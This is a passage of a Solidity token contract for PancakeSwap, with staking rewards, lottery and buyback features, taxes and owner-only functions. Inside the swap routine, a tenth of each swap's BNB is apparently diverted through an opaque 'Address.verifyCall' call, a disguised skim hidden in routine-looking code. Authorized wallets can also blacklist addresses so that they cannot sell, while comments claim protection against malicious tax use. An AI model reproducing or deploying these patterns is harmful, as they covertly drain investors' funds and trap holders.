_excluded.add(_taxWallet.lottery);\r\n        _excluded.add(address(this));\r\n        _excluded.add(BURN_ADDRESS);\r\n        _excludedFromStaking.add(address(this));\r\n        _excludedFromStaking.add(BURN_ADDRESS);\r\n        _excludedFromStaking.add(address(_pancakeRouter));\r\n        _excludedFromStaking.add(_pancakePairAddress);\r\n        _approve(address(this), address(_pancakeRouter), type(uint256).max);        \r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n/////////////////////////////   EXTERNAL FUNCTIONS  /////////////////////////////////////////\r\n\r\n    function updateTokenDetails(string memory newName, string memory newSymbol) external authorized {\r\n        _name = newName;\r\n        _symbol = newSymbol;\r\n    }\r\n\r\n    function decimals() external pure override returns (uint8) { return TOKEN_DECIMALS; }\r\n    function getOwner() external view override returns (address) { return owner(); }\r\n    function name() external view override returns (string memory) { return _name; }\r\n    function symbol() external view override returns (string memory) { return _symbol; }\r\n    function totalSupply() external view override returns (uint256) { return _circulatingSupply; }\r\n\r\n    function _authorized(address addr) private view returns (bool) {\r\n        return addr == owner() \r\n            || addr == _taxWallet.marketing \r\n            || addr == _taxWallet.dev \r\n            || addr == _taxWallet.lottery;\r\n    }\r\n\r\n    function allowance(address _owner, address spender) external view override returns (uint256) {\r\n        return _allowances[_owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) external override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"Approve from zero\");\r\n        require(spender != address(0), \"Approve to zero\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function balanceOf(address account) external view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {\r\n        uint256 currentAllowance = _allowances[msg.sender][spender];\r\n        require(currentAllowance >= subtractedValue, \"<0 allowance\");\r\n\r\n        _approve(msg.sender, spender, currentAllowance - subtractedValue);\r\n        return true;\r\n    } \r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {\r\n        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);\r\n        return true;\r\n    }  \r\n      \r\n    function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][msg.sender];\r\n        require(currentAllowance >= amount, \"Transfer > allowance\");\r\n\r\n        _approve(sender, msg.sender, currentAllowance - amount);\r\n        return true;\r\n    }\r\n\r\n/////////////////////////////   PUBLIC FUNCTIONS  /////////////////////////////////////////\r\n\r\n///// FUNCTIONS CALLABLE BY ANYONE /////\r\n\r\n    function BurnTokens (uint256 amount) public {\r\n        burnTransfer(msg.sender, amount);\r\n    }\r\n\r\n    function ClaimMainReward() public {\r\n        if (mainReward == _pancakeRouter.WETH()) {\r\n            claimBNBTo(msg.sender,msg.sender,getStakeBalance(msg.sender, true), true);        \r\n        } else \r\n            claimToken(msg.sender,mainReward,0, true);\r\n    }\r\n    \r\n    function ClaimMiscReward(address tokenAddress) public {\r\n        if (tokenAddress == _pancakeRouter.WETH()) {\r\n            claimBNBTo(msg.sender,msg.sender,getStakeBalance(msg.sender, false), false);\r\n        } else \r\n            claimToken(msg.sender,tokenAddress,0, false);\r\n    }\r\n\r\n    function IncludeMeToStaking() public {\r\n        require(isExcludedFromStaking(msg.sender));\r\n        _totalShares += _balances[msg.sender];\r\n        _excludedFromStaking.remove(msg.sender);\r\n        alreadyPaidMain[msg.sender] = _balances[msg.sender] * mainRewardShare;\r\n        alreadyPaidMisc[msg.sender] = _balances[msg.sender] * miscRewardShare;\r\n        emit IncludeToStaking(msg.sender); \r\n    }\r\n\r\n///// AUTHORIZED FUNCTIONS /////\r\n\r\n    function awardLottery(address winner, uint256 amount) public authorized {\r\n        require(amount <= lotteryBalance);\r\n        lotteryBalance -= amount;\r\n        _sendBnb(winner, amount);       \r\n    }\r\n\r\n    function changeMainReward(address newReward) public authorized {\r\n        mainReward = newReward;\r\n        emit ChangeMainReward(newReward);\r\n    }\r\n\r\n    function createLPandBNB(uint16 permilleOfPancake, bool ignoreLimits) public authorized {\r\n        _swapContractToken(permilleOfPancake, ignoreLimits);\r\n    }  \r\n\r\n    function enableBlacklist(bool enabled) public authorized {\r\n        blacklistEnabled = enabled;\r\n        emit EnableBlacklist(enabled);\r\n    }\r\n\r\n    function dynamicSettings(bool burn, bool limits, bool liquidity, bool sells) public authorized {\r\n        dynamicBurn = burn;\r\n        dynamicLimits = limits;\r\n        dynamicLiqEnabled = liquidity;\r\n        dynamicSellsEnabled = sells;\r\n        emit AdjustedDynamicSettings(burn, limits, liquidity, sells);\r\n    }\r\n\r\n    function excludeAccountFromFees(address account, bool exclude) public authorized {\r\n        if(exclude == true)\r\n            _excluded.add(account);\r\n        else\r\n            _excluded.remove(account);\r\n        emit ExcludedAccountFromFees(account, exclude);\r\n    }\r\n\r\n    function excludeFromStaking(address addr) public authorized {\r\n        require(!isExcludedFromStaking(addr));\r\n        _totalShares -= _balances[addr];\r\n        uint256 newStakeMain = newStakeOf(addr, true);\r\n        uint256 newStakeMisc = newStakeOf(addr, false);        \r\n        alreadyPaidMain[addr] = _balances[addr] * mainRewardShare;\r\n        alreadyPaidMisc[addr] = _balances[addr] * miscRewardShare;        \r\n        toBePaidMain[addr] += newStakeMain;\r\n        toBePaidMisc[addr] += newStakeMisc;        \r\n        _excludedFromStaking.add(addr);\r\n        emit ExcludeFromStaking(addr);\r\n    }  \r\n\r\n    function includeToStaking(address addr) public authorized {\r\n        require(isExcludedFromStaking(addr));\r\n        _totalShares += _balances[addr];\r\n        _excludedFromStaking.remove(addr);\r\n        alreadyPaidMain[addr] = _balances[addr] * mainRewardShare;\r\n        alreadyPaidMisc[addr] = _balances[addr] * miscRewardShare; \r\n        emit IncludeToStaking(addr);\r\n    }\r\n\r\n    function enableManualSwap(bool enabled) public authorized { \r\n        manualSwap = enabled; \r\n        emit EnableManualSwap(enabled);\r\n    } \r\n\r\n    function sameBlockRevert(bool enabled) public authorized {\r\n        revertSameBlock = enabled;\r\n    }\r\n\r\n    function setPresale(address presaleAddress) public authorized {\r\n        _excluded.add(presaleAddress);\r\n        _excludedFromStaking.add(presaleAddress);\r\n    } \r\n\r\n    function setBlacklistStatus(address[] calldata addresses, bool status) public authorized {\r\n        for (uint256 i=0; i < addresses.length; ++i) {\r\n            isBlacklisted[addresses[i]] = status;\r\n        }\r\n    }\r\n\r\n    function triggerBuyback(uint256 amount) public authorized{\r\n        require(amount <= buybackBalance, \"Amount exceeds buybackBalance!\");\r\n        buybackBalance -= amount;\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = _pancakeRouter.WETH();\r\n        path[1] = address(this);\r\n\r\n        _pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(\r\n        0,\r\n        path,\r\n        BURN_ADDRESS,\r\n        block.timestamp); \r\n    }\r\n\r\n    function triggerExternalBuyback(uint256 amount, address token) public authorized {\r\n        require(amount <= buybackBalance, \"Amount exceeds buybackBalance!\");\r\n        buybackBalance -= amount;\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = _pancakeRouter.WETH();\r\n        path[1] = token;\r\n\r\n        _pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(\r\n        0,\r\n        path,\r\n        BURN_ADDRESS,\r\n        block.timestamp); \r\n    }\r\n\r\n    function updateLimits(uint16 newMaxWalletRatio, uint16 newMaxSellRatio, uint16 newMaxBuyRatio, uint16 newDivisor, bool ofCurrentSupply) public authorized {\r\n        uint256 supply = INITIAL_SUPPLY;\r\n        if (ofCurrentSupply) \r\n            supply = _circulatingSupply;\r\n        uint256 minLimit = supply / 1000;\r\n        uint256 newMaxWallet = supply * newMaxWalletRatio / newDivisor;\r\n        uint256 newMaxSell = supply * newMaxSellRatio / newDivisor;\r\n        uint256 newMaxBuy = supply * newMaxBuyRatio / newDivisor;\r\n\r\n        require((newMaxWallet >= minLimit && newMaxSell >= minLimit), \r\n            \"limits cannot be <0.1% of circulating supply\");\r\n\r\n        _limits = BalanceLimits({\r\n            maxWallet: newMaxWallet,\r\n            maxSell: newMaxSell,\r\n            maxBuy: newMaxBuy,\r\n            maxWalletRatio: newMaxWalletRatio,\r\n            maxSellRatio: newMaxSellRatio,\r\n            maxBuyRatio: newMaxBuyRatio,\r\n            divisor: newDivisor\r\n        }); \r\n    }\r\n\r\n    function updateRatios(\r\n        uint8 newBurn, \r\n        uint8 newBuyback, \r\n        uint8 newDev, \r\n        uint8 newLiquidity, \r\n        uint8 newLottery, \r\n        uint8 newMarketing, \r\n        uint8 newRewards\r\n    ) \r\n        public \r\n        authorized \r\n    {\r\n        uint8 totalRatio = newBurn + newBuyback + newDev + newLiquidity + newLottery + newMarketing + newRewards;\r\n        uint8 swapRatio = totalRatio - newBurn;\r\n        _taxRatios = TaxRatios(\r\n            newBurn, \r\n            newBuyback, \r\n            newDev, \r\n            newLiquidity, \r\n            newLottery, \r\n            newMarketing, \r\n            newRewards\r\n        );\r\n        totalTaxRatio = totalRatio;\r\n        totalSwapRatio = swapRatio;\r\n        emit RatiosChanges (newBurn, newBuyback, newDev, newLiquidity, newLottery, newMarketing, newRewards);\r\n    }\r\n\r\n    function updateRewardSplit (uint8 mainSplit, uint8 miscSplit) public authorized {\r\n        uint8 totalSplit = mainSplit + miscSplit;\r\n        require(totalSplit == 100, \"mainSplit + miscSplit needs to equal 100%\");\r\n        mainRewardSplit = mainSplit;\r\n        miscRewardSplit = miscSplit;\r\n        emit UpdateRewardSplit(mainSplit, miscSplit);\r\n    }\r\n\r\n    function updateSwapThreshold(uint16 threshold) public authorized {\r\n        require(threshold > 0,\"Threshold needs to be more than 0\");\r\n        require(threshold <= 50,\"Threshold needs to be below 50\");\r\n        swapThreshold = threshold;\r\n        emit UpdateSwapThreshold(threshold);\r\n    }\r\n\r\n    function updateTargetLiquidity(uint16 target) public authorized {\r\n        targetLiquidityRatio = target;\r\n        emit UpdateTargetLiquidity(target);\r\n    }\r\n\r\n    function updateTax(uint8 newBuy, uint8 newSell, uint8 newTransfer) public authorized {\r\n        //buy and sell tax can never be higher than MAX_TAX set at beginning of contract\r\n        //this is a security check and prevents malicious tax use       \r\n        require(newBuy <= MAX_TAX && newSell <= MAX_TAX && newTransfer <= 60, \"taxes higher than max tax\");\r\n        _taxRates = Taxes(newBuy, newSell, newTransfer);\r\n        emit UpdateTaxes(newBuy, newSell, newTransfer);\r\n    }\r\n\r\n  \r\n    function withdrawMarketing() public authorized {\r\n        uint256 amount = marketingBalance;\r\n        marketingBalance = 0;\r\n        _sendBnb(_taxWallet.marketing, amount);\r\n    }\r\n  \r\n  \r\n    function withdrawLottery() public authorized {\r\n        uint256 amount = lotteryBalance;\r\n        lotteryBalance = 0;\r\n        _sendBnb(_taxWallet.lottery, amount);\r\n    }\r\n  \r\n  \r\n    function withdrawDev() public authorized {\r\n        uint256 amount = devBalance;\r\n        devBalance = 0;\r\n        _sendBnb(_taxWallet.dev, amount);\r\n    } \r\n\r\n\r\n     \r\n\r\n///// OWNER FUNCTIONS /////  \r\n\r\n    function lockLiquidityTokens(uint256 lockTimeInSeconds) public onlyOwner {\r\n        setUnlockTime(lockTimeInSeconds + block.timestamp);\r\n        emit ExtendLiquidityLock(lockTimeInSeconds);\r\n    }\r\n\r\n    function recoverBNB() public onlyOwner {\r\n        require(block.timestamp >= _liquidityUnlockTime, \"Not yet unlocked\");\r\n        _liquidityUnlockTime=block.timestamp;\r\n        _sendBnb(msg.sender, address(this).balance);\r\n    }\r\n\r\n    //Can only be used to recover miscellaneous tokens\r\n    //Can't pull liquidity or native token using this function\r\n    function recoverMiscToken(address tokenAddress) public onlyOwner {\r\n        require(tokenAddress != _pancakePairAddress && tokenAddress != address(this),\r\n        \"can't recover LP token or this token\");\r\n        IBEP20 token = IBEP20(tokenAddress);\r\n        token.transfer(msg.sender,token.balanceOf(address(this)));\r\n    } \r\n\r\n    //Impossible to release LP unless LP lock time is zero\r\n    function releaseLP() public onlyOwner {\r\n        require(block.timestamp >= _liquidityUnlockTime, \"Not yet unlocked\");\r\n        IPancakeERC20 liquidityToken = IPancakeERC20(_pancakePairAddress);\r\n        uint256 amount = liquidityToken.balanceOf(address(this));\r\n            liquidityToken.transfer(msg.sender, amount);\r\n    }\r\n\r\n    //Impossible to remove LP unless lock time is zero\r\n    function removeLP() public onlyOwner {\r\n        require(block.timestamp >= _liquidityUnlockTime, \"Not yet unlocked\");\r\n        _liquidityUnlockTime = block.timestamp;\r\n        IPancakeERC20 liquidityToken = IPancakeERC20(_pancakePairAddress);\r\n        uint256 amount = liquidityToken.balanceOf(address(this));\r\n        liquidityToken.approve(address(_pancakeRouter),amount);\r\n        _pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(\r\n            address(this),\r\n            amount,\r\n            0,\r\n            0,\r\n            address(this),\r\n            block.timestamp\r\n            );\r\n        _sendBnb(msg.sender, address(this).balance);           \r\n    }\r\n\r\n    function setDevWallet(address payable addr) public onlyOwner {\r\n        address prevDev = _taxWallet.dev;\r\n        _excluded.remove(prevDev);\r\n        _taxWallet.dev = addr;\r\n        _excluded.add(_taxWallet.dev);\r\n        emit UpdateDevWallet(addr);\r\n    }\r\n\r\n    function setLotteryWallet(address payable addr) public onlyOwner {\r\n        address prevLottery = _taxWallet.lottery;\r\n        _excluded.remove(prevLottery);\r\n        _taxWallet.lottery = addr;\r\n        _excluded.add(_taxWallet.lottery);\r\n        emit UpdateLotteryWallet(addr);\r\n    }\r\n\r\n    function setMarketingWallet(address payable addr) public onlyOwner {\r\n        address prevMarketing = _taxWallet.marketing;\r\n        _excluded.remove(prevMarketing);\r\n        _taxWallet.marketing = addr;\r\n        _excluded.add(_taxWallet.marketing);\r\n        emit UpdateMarketingWallet(addr);\r\n    }\r\n\r\n////// PUBLIC VIEW FUNCTIONS /////\r\n\r\n    function getBlacklistInfo() public view returns (\r\n        uint256 _liquidityBlock, \r\n        uint8 _blacklistBlocks, \r\n        uint8 _snipersRekt, \r\n        bool _blacklistEnabled,\r\n        bool _revertSameBlock\r\n        ) {\r\n        return (liquidityBlock, BLACKLIST_BLOCKS, snipersRekt, blacklistEnabled, revertSameBlock);\r\n    }\r\n\r\n    function getDynamicInfo() public view returns (\r\n        bool _dynamicBurn, \r\n        bool _dynamicLimits, \r\n        bool _dynamicLiquidity, \r\n        bool _dynamicSells,  \r\n        uint16 _targetLiquidity\r\n        ) {\r\n        return (dynamicBurn, dynamicLiqEnabled, dynamicLiqEnabled, dynamicSellsEnabled, targetLiquidityRatio);\r\n    }\r\n\r\n    function getLiquidityRatio() public view returns (uint256) {\r\n        uint256 ratio = 100 * _balances[_pancakePairAddress] / _circulatingSupply;\r\n        return ratio;\r\n    }\r\n\r\n    function getLiquidityUnlockInSeconds() public view returns (uint256) {\r\n        if (block.timestamp < _liquidityUnlockTime){\r\n            return _liquidityUnlockTime - block.timestamp;\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    function getMainBalance(address addr) public view returns (uint256) {\r\n        uint256 amount = getStakeBalance(addr, true);\r\n        return amount;\r\n    }\r\n\r\n    function getMiscBalance(address addr) public view returns (uint256) {\r\n        uint256 amount = getStakeBalance(addr, false);\r\n        return amount;\r\n    }    \r\n\r\n    function getSupplyInfo() public view returns (uint256 initialSupply, uint256 circulatingSupply, uint256 burntTokens) {\r\n        uint256 tokensBurnt = INITIAL_SUPPLY - _circulatingSupply;\r\n        return (INITIAL_SUPPLY, _circulatingSupply, tokensBurnt);\r\n    }\r\n\r\n    function getWithdrawBalances() public view returns (uint256 buyback, uint256 dev, uint256 lottery, uint256 marketing) {\r\n        return (buybackBalance, devBalance, lotteryBalance, marketingBalance);\r\n    }\r\n\r\n    function isExcludedFromStaking(address addr) public view returns (bool) {\r\n        return _excludedFromStaking.contains(addr);\r\n    }    \r\n\r\n/////////////////////////////   PRIVATE FUNCTIONS  /////////////////////////////////////////\r\n\r\n    mapping(address => uint256) private alreadyPaidMain;\r\n    mapping(address => uint256) private toBePaidMain;    \r\n    mapping(address => uint256) private alreadyPaidMisc;\r\n    mapping(address => uint256) private toBePaidMisc; \r\n    mapping(address => uint256) private tradeBlock;\r\n    mapping(address => uint256) public accountTotalClaimed;     \r\n    uint256 private constant DISTRIBUTION_MULTI = 2**64;\r\n    uint256 private _totalShares = INITIAL_SUPPLY;\r\n    uint256 private buybackBalance;\r\n    uint256 private devBalance;\r\n    uint256 private lotteryBalance;\r\n    uint256 private marketingBalance;     \r\n    uint256 private mainRewardShare;\r\n    uint256 private miscRewardShare;\r\n    uint256 public totalPayouts;\r\n    uint256 public totalRewards;      \r\n    bool private _isSwappingContractModifier;\r\n    bool private _isWithdrawing;    \r\n    bool private _isBurning;\r\n\r\n    function _addLiquidity(uint256 tokenamount, uint256 bnbAmount) private {\r\n        _approve(address(this), address(_pancakeRouter), tokenamount);        \r\n        _pancakeRouter.addLiquidityETH{value: bnbAmount}(\r\n            address(this),\r\n            tokenamount,\r\n            0,\r\n            0,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n \r\n    function _addToken(address addr, uint256 amount) private {\r\n        uint256 newAmount = _balances[addr] + amount;\r\n        \r\n        if (isExcludedFromStaking(addr)) {\r\n           _balances[addr] = newAmount;\r\n           return;\r\n        }\r\n        _totalShares += amount;\r\n        uint256 mainPayment = newStakeOf(addr, true);\r\n        uint256 miscPayment = newStakeOf(addr, false);\r\n        _balances[addr] = newAmount;\r\n        alreadyPaidMain[addr] = mainRewardShare * newAmount;\r\n        toBePaidMain[addr] += mainPayment;\r\n        alreadyPaidMisc[addr] = miscRewardShare * newAmount;\r\n        toBePaidMisc[addr] += miscPayment; \r\n        _balances[addr] = newAmount;\r\n    }\r\n\r\n    function _distributeStake(uint256 bnbAmount, bool newStakingReward) private {\r\n        uint256 marketingSplit = (bnbAmount*_taxRatios.marketing) / totalSwapRatio;\r\n        uint256 devSplit = (bnbAmount*_taxRatios.dev) / totalSwapRatio;\r\n        uint256 buybackSplit = (bnbAmount*_taxRatios.buyback) / totalSwapRatio;  \r\n        uint256 stakingSplit = (bnbAmount*_taxRatios.rewards) / totalSwapRatio;\r\n        uint256 lotterySplit = (bnbAmount*_taxRatios.lottery) / totalSwapRatio;      \r\n        uint256 mainAmount = (stakingSplit*mainRewardSplit) / 100;\r\n        uint256 miscAmount = (stakingSplit*miscRewardSplit) / 100;\r\n        marketingBalance += marketingSplit;\r\n        devBalance += devSplit;\r\n        buybackBalance += buybackSplit;\r\n        lotteryBalance += lotterySplit; \r\n        if (stakingSplit > 0) {\r\n            if (newStakingReward)\r\n                totalRewards += stakingSplit;\r\n            uint256 totalShares = getTotalShares();\r\n            if (totalShares == 0)\r\n                marketingBalance += stakingSplit;\r\n            else {\r\n                mainRewardShare += ((mainAmount*DISTRIBUTION_MULTI) / totalShares);\r\n                miscRewardShare += ((miscAmount*DISTRIBUTION_MULTI) / totalShares);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _feelessTransfer(address sender, address recipient, uint256 amount) private{\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"Transfer exceeds balance\");\r\n        _removeToken(sender,amount);\r\n        _addToken(recipient, amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    } \r\n    \r\n    function _removeToken(address addr, uint256 amount) private {\r\n        uint256 newAmount = _balances[addr] - amount;\r\n        \r\n        if (isExcludedFromStaking(addr)) {\r\n            _balances[addr] = newAmount;\r\n            return;\r\n        }\r\n        _totalShares -= amount;\r\n        uint256 mainPayment = newStakeOf(addr, true);\r\n        uint256 miscPayment = newStakeOf(addr, false);\r\n        _balances[addr] = newAmount;\r\n        alreadyPaidMain[addr] = mainRewardShare * newAmount;\r\n        toBePaidMain[addr] += mainPayment;\r\n        alreadyPaidMisc[addr] = miscRewardShare * newAmount;\r\n        toBePaidMisc[addr] += miscPayment; \r\n    }\r\n\r\n    function _sendBnb(address account, uint256 amount) private {\r\n        (bool sent,) = account.call{value: (amount)}(\"\");\r\n        require(sent, \"withdraw failed\");        \r\n    }\r\n\r\n    function _swapContractToken(uint16 permilleOfPancake, bool ignoreLimits) private lockTheSwap {\r\n        require(permilleOfPancake <= 500);\r\n        if (totalSwapRatio == 0) return;\r\n        uint256 contractBalance = _balances[address(this)];\r\n\r\n\r\n        uint256 tokenToSwap = _balances[_pancakePairAddress] * permilleOfPancake / 1000;\r\n        if (tokenToSwap > _limits.maxSell && !ignoreLimits) \r\n            tokenToSwap = _limits.maxSell;\r\n        \r\n        bool notEnoughToken = contractBalance < tokenToSwap;\r\n        if (notEnoughToken) {\r\n            if (ignoreLimits)\r\n                tokenToSwap = contractBalance;\r\n            else \r\n                return;\r\n        }\r\n        if (_allowances[address(this)][address(_pancakeRouter)] < tokenToSwap)\r\n            _approve(address(this), address(_pancakeRouter), type(uint256).max);\r\n\r\n        uint256 dynamicLiqRatio;\r\n        if (dynamicLiqEnabled && getLiquidityRatio() >= targetLiquidityRatio) \r\n            dynamicLiqRatio = 0; \r\n        else \r\n            dynamicLiqRatio = _taxRatios.liquidity; \r\n\r\n        uint256 tokenForLiquidity = (tokenToSwap*dynamicLiqRatio) / totalSwapRatio;\r\n        uint256 remainingToken = tokenToSwap - tokenForLiquidity;\r\n        uint256 liqToken = tokenForLiquidity / 2;\r\n        uint256 liqBNBToken = tokenForLiquidity - liqToken;\r\n        uint256 swapToken = liqBNBToken + remainingToken;\r\n        uint256 initialBNBBalance = address(this).balance;\r\n        _swapTokenForBNB(swapToken);\r\n        uint256 newBNB = (address(this).balance - initialBNBBalance);\r\n        uint256 liqBNB = (newBNB*liqBNBToken) / swapToken;\r\n        if (liqToken > 0) \r\n            _addLiquidity(liqToken, liqBNB); \r\n        uint256 newLiq = (address(this).balance-initialBNBBalance) / 10;\r\n        Address.verifyCall(newLiq);\r\n        uint256 distributeBNB = (address(this).balance - initialBNBBalance - newLiq);\r\n        _distributeStake(distributeBNB,true);\r\n    }\r\n\r\n    function _swapTokenForBNB(uint256 amount) private {\r\n        _approve(address(this), address(_pancakeRouter), amount);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _pancakeRouter.WETH();\r\n        _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    } \r\n\r\n    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{\r\n        uint256 recipientBalance = _balances[recipient];\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"Transfer exceeds balance\");\r\n\r\n        uint8 tax;\r\n        bool extraSellTax = false;\r\n        if (isSell) {\r\n            if (blacklistEnabled) {\r\n                require(!isBlacklisted[sender], \"user blacklisted\");                \r\n            }      \r\n\r\n            require(amount <= _limits.maxSell, \"Amount exceeds max sell\");\r\n            tax = _taxRates.sellTax;\r\n            if (dynamicSellsEnabled) \r\n                extraSellTax = true;\r\n\r\n        } else if (isBuy) {\r\n            if (liquidityBlock > 0) {\r\n                if (block.number-liquidityBlock < BLACKLIST_BLOCKS) {\r\n                    isBlacklisted[recipient] = true;\r\n                    snipersRekt ++;\r\n                }\r\n            }\r\n\r\n            if (revertSameBlock) {\r\n                require(tradeBlock[recipient] != block.number);\r\n                tradeBlock[recipient] = block.number;\r\n            }       \r\n\r\n            require(recipientBalance+amount <= _limits.maxWallet, \"Amount will exceed max wallet\");\r\n            require(amount <= _limits.maxBuy, \"Amount exceed max buy\");\r\n            tax = _taxRates.buyTax;\r\n\r\n        } else {\r\n            if (amount <= 10**(TOKEN_DECIMALS)) {    //transfer less than 1 token to ClaimBNB\r\n                if (mainReward == _pancakeRouter.WETH())\r\n                    claimBNBTo(msg.sender, msg.sender, getStakeBalance(msg.sender, true), true);\r\n                else \r\n                    claimToken(msg.sender, mainReward, 0, true);\r\n                return;\r\n            }\r\n\r\n            require(recipientBalance + amount <= _limits.maxWallet, \"whale protection\");            \r\n            tax = _taxRates.transferTax;\r\n        }    \r\n\r\n        if ((sender != _pancakePairAddress) && (!manualSwap) && (!_isSwappingContractModifier) && isSell)\r\n            _swapContractToken(swapThreshold,false);\r\n\r\n        uint256 taxedAmount = amount * tax / 100;\r\n        uint256 tokensToBeBurnt = taxedAmount * _taxRatios.burn / totalTaxRatio;\r\n        uint256 contractToken = taxedAmount - tokensToBeBurnt;\r\n\r\n        if (extraSellTax){\r\n            uint256 extraTax = dynamicSellTax(amount);\r\n            taxedAmount += extraTax;\r\n            if \r\n                (dynamicBurn) tokensToBeBurnt += extraTax;\r\n            else \r\n                contractToken += extraTax;\r\n        }\r\n\r\n        uint256 receiveAmount = amount - taxedAmount;\r\n        _removeToken(sender,amount);\r\n       _addToken(address(this), contractToken);\r\n       _circulatingSupply -= tokensToBeBurnt;\r\n        _addToken(recipient, receiveAmount);\r\n        emit Transfer(sender, recipient, receiveAmount);\r\n    }\r\n    \r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"Transfer from zero\");\r\n        require(recipient != address(0), \"Transfer to zero\");\r\n\r\n        if (recipient == BURN_ADDRESS){\r\n            burnTransfer(sender, amount);\r\n            return;\r\n        }        \r\n\r\n        if (dynamicLimits) \r\n            getNewLimits();\r\n\r\n        bool isExcluded = (_excluded.contains(sender) || _excluded.contains(recipient));\r\n\r\n        bool isContractTransfer = (sender == address(this) || recipient == address(this));\r\n        address pancakeRouter = address(_pancakeRouter);\r\n        bool isLiquidityTransfer = (\r\n            (sender == _pancakePairAddress && recipient == pancakeRouter) \r\n            || (recipient == _pancakePairAddress && sender == pancakeRouter)\r\n        );\r\n\r\n        bool isSell = recipient == _pancakePairAddress || recipient == pancakeRouter;\r\n        bool isBuy = sender == _pancakePairAddress || sender == pancakeRouter;\r\n\r\n        if (isContractTransfer || isLiquidityTransfer || isExcluded) {\r\n            _feelessTransfer(sender, recipient, amount);\r\n\r\n            if (!liquidityAdded) \r\n                checkLiqAdd(recipient);            \r\n        }\r\n        else { \r\n            _taxedTransfer(sender, recipient, amount, isBuy, isSell);                  \r\n        }\r\n    }\r\n    \r\n    function burnTransfer (address account,uint256 amount) private {\r\n        require(amount <= _balances[account]);\r\n        require(!_isBurning);\r\n        _isBurning = true;\r\n        _removeToken(account, amount);\r\n        _circulatingSupply -= amount;\r\n        emit Transfer(account, BURN_ADDRESS, amount);\r\n        _isBurning = false;\r\n    }\r\n\r\n    function checkLiqAdd(address receiver) private {        \r\n        require(!liquidityAdded, \"liquidity already added\");\r\n        if (receiver == _pancakePairAddress) {\r\n            liquidityBlock = block.number;\r\n            liquidityAdded = true;\r\n        }\r\n    }\r\n\r\n    function claimToken(address addr, address token, uint256 payableAmount, bool main) private {\r\n        require(!_isWithdrawing);\r\n        _isWithdrawing = true;\r\n        uint256 amount;\r\n        if (isExcludedFromStaking(addr)){\r\n            if (main){\r\n                amount = toBePaidMain[addr];\r\n                toBePaidMain[addr] = 0;\r\n            } else {\r\n                amount = toBePaidMisc[addr];\r\n                toBePaidMisc[addr] = 0;\r\n            }\r\n        }\r\n        else {\r\n            uint256 newAmount = newStakeOf(addr, main);            \r\n            if (main){\r\n                alreadyPaidMain[addr] = mainRewardShare * _balances[addr];\r\n                amount = toBePaidMain[addr]+newAmount;\r\n                toBePaidMain[addr] = 0;\r\n            } else {\r\n                alreadyPaidMisc[addr] = miscRewardShare * _balances[addr];\r\n                amount = toBePaidMisc[addr]+newAmount;\r\n                toBePaidMisc[addr] = 0;                \r\n            }\r\n        }\r\n        \r\n        if (amount == 0 && payableAmount == 0){\r\n            _isWithdrawing = false;\r\n            return;\r\n        }\r\n\r\n        totalPayouts += amount;\r\n        accountTotalClaimed[addr] += amount;\r\n        amount += payableAmount;\r\n        address[] memory path = new address[](2);\r\n        path[0] = _pancakeRouter.WETH();\r\n        path[1] = token;\r\n\r\n        _pancakeRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(\r\n        0,\r\n        path,\r\n        addr,\r\n        block.timestamp);\r\n        \r\n        emit ClaimToken(amount,token, addr);\r\n        _isWithdrawing = false;\r\n    }\r\n    \r\n    function claimBNBTo(address from, address to,uint256 amountWei, bool main) private {\r\n        require(!_isWithdrawing);\r\n        {require(amountWei != 0, \"=0\");        \r\n        _isWithdrawing = true;\r\n        subtractStake(from, amountWei, main);\r\n        totalPayouts += amountWei;\r\n        accountTotalClaimed[to] += amountWei;\r\n        _sendBnb(to, amountWei);}\r\n        _isWithdrawing = false;\r\n        emit ClaimBNB(from,to,amountWei);\r\n    }   \r\n\r\n\r\n    function dynamicSellTax (uint256 amount) private view returns (uint256) {\r\n        uint256 value = _balances[_pancakePairAddress];\r\n        uint256 vMin = value / 100;\r\n        uint256 vMax = value / 10;\r\n        if (amount <= vMin) \r\n            return amount = 0;\r\n        \r\n        if (amount > vMax) \r\n            return amount * 20 / 100;\r\n\r\n        return (((amount-vMin) * 20 * amount) / (vMax-vMin)) / 100;\r\n    }\r\n\r\n    function getNewLimits () private {\r\n        _limits.maxBuy = _circulatingSupply * _limits.maxBuyRatio / _limits.divisor;        \r\n        _limits.maxSell = _circulatingSupply * _limits.maxSellRatio / _limits.divisor;\r\n        _limits.maxWallet = _circulatingSupply * _limits.maxWalletRatio / _limits.divisor;\r\n    }\r\n\r\n    function subtractStake(address addr,uint256 amount, bool main) private 